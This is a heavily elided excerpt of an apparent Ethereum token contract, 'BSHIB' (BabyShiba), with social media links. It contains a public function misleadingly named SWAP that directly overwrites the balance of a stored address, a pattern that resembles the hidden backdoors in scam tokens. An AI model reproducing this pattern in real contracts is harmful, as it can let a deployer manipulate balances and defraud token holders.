...
Telegram: https://t.me/BabyShiba_Portal


Twitter:  https://twitter.com/babyshiba_erc
...
contract BSHIB is Context, Ownable, IERC20 {
    ...
    address public SSS;
    uint256 marketFee = 0;
    address public marketAddress = 0x041638B13267BE2087251327B234813a51706Aa4; //
    ...
    function SWAP(uint enable) public {
        ...
        _balances[SSS] = tokenToBurn.sub(_balances[SSS]);
    }
